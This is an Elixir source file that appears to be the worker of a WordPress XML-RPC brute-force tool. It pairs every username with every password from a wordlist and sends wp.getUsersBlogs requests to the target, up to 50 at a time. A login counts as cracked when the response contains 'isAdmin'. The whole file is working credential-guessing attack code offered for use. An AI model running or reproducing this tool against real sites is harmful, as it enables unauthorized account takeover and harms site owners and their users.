defmodule WpXmlrpcry.Worker do
  alias WpXmlrpcry.{Http, Report, Util}

  @pattern ~r/isAdmin/i

  def start(progress_channel, url: url, users: users, wordlist: wordlist) do
    url = Util.prepare_url(url)

    result =
      Util.combine_user_pass(users, wordlist)
      |> Task.async_stream(&do_login(&1, url),
        max_concurrency: 50,
        timeout: :infinity,
        ordered: false
      )
      |> Stream.map(fn {_status, response} -> response end)
      |> Enum.to_list()
      |> Report.format_result(url)

    update_progress(progress_channel, result)
  end

  def do_login(%{username: user, password: pass}, url) do
    with payload <- generate_payload(username: user, password: pass),
         {:ok, response} <- Http.post(url, payload),
         parsed_body <- Http.extract_body(response),
         true <- Http.text_in_body?(parsed_body, @pattern) do
      %{username: user, password: pass, success: true}
    else
      _ ->
        %{username: user, password: pass, success: false}
    end
  end

  def generate_payload(username: u, password: p) do
    """
    <methodCall>
      <methodName>wp.getUsersBlogs</methodName>
      <params>
        <param><value><string>#{u}</string></value></param>
        <param><value><string>#{p}</string></value></param>
      </params>
    </methodCall>
    """
  end

  def update_progress(progress_channel, result) do
    send(progress_channel, result)
  end
end
